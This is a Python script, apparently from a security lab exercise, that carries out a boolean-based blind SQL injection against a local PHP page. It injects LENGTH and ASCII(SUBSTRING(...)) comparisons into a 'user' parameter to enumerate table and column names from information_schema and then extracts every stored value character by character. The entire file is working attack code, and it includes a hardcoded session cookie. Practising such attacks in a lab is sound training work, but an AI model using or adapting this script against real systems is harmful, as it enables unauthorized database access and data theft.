import urllib.request
import urllib.parse
import string


BASE_URL = "http://localhost:8000/blindsqli.php?user="
MY_COOKIE = "PHPSESSID=1c1df5fba202f6a061f48d241143a071"


def check_boolean_query(payload):
    encoded_payload = urllib.parse.quote(payload)
    url = BASE_URL + encoded_payload
   
    headers = {
        'Cookie': MY_COOKIE
    }
    req = urllib.request.Request(url, headers=headers)
   
    response = urllib.request.urlopen(req)
    html_content = response.read().decode('utf-8')
    
    # This text will appear on the screen only if the query was successful
    if "In wonderland right now" in html_content:
        return True
    else:
        return False

def calculate_length(query):
    length = 0
    for i in range(1, 100):
        payload = f"alice' AND LENGTH(({query})) = {i} -- a"
        if check_boolean_query(payload):
            length = i
            break
    
    # couldn't find answer with length between 1 to 100
    if length == 0:
        return None
   
    return length

def guess_query(query, length):
    # we assume that all characters contain only latin letters and digits.
    charset = string.ascii_letters + string.digits
    result = ""
    for i in range(1, length + 1):
        for char in charset:
            char_ascii = ord(char)
            payload = f"alice' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {char_ascii} -- a"
            if check_boolean_query(payload):
                result += char
                break
    return result


def extract_query(query):
    length = calculate_length(query)
    if length is None:
        return None
    return guess_query(query, length)


if __name__ == "__main__":
    print("This script is performing a blind sql attack.")
    print("It can ask true or false questions to the database by trying to sign in as alice if an expression is true.")
    print("This script find all of the tables in the \'secure\' database (there\'s only one),\n look for all the columns for the table (again, only one) and find the values of the fields in the table.\n")
    # The following query ment to check if we can even access the db.
    if not check_boolean_query("alice' AND 1=1 -- a"):
        print("\nSanity Check FAILED! Make sure your Cookie hasn't expired.")
    else:
        sql_table_query = "SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1"
        print(f'{"-" * 25}\n{" " * 7}TABLE NAME\n{"-" * 25}')
        table_name = extract_query(sql_table_query)
        print(f"\tTable name: {table_name}\n")

        col_name_query = "SELECT column_name FROM information_schema.columns WHERE table_name=0x3738396230353637386537663935356432636631323562306330353631366339 LIMIT 1"
        print(f'{"-" * 25}\n{" " * 7}COLUMN NAME\n{"-" * 25}')
        col_name = extract_query(col_name_query)
        print(f"\tColumn name: {col_name}\n")

        count_query = f"SELECT COUNT(*) FROM secure.`{table_name}`"
        print(f'{"-" * 25}\n{" " * 7}ROW COUNT\n{"-" * 25}')
        row_count_str = extract_query(count_query)
        print(f"\tNumber of rows: {row_count_str}\n")



        count_query = f"SELECT COUNT(*) FROM secure.`{table_name}`"
        print(f'{"-" * 25}\n{" " * 7}VALUES\n{"-" * 25}')
        row_count_str = extract_query(count_query)
        row_count = int(row_count_str)
        for i in range(row_count):
            val_query = f"SELECT {col_name} FROM secure.`{table_name}` LIMIT {i}, 1"
            value = extract_query(val_query)
            print(f"\tValue {i+1}: {value}")
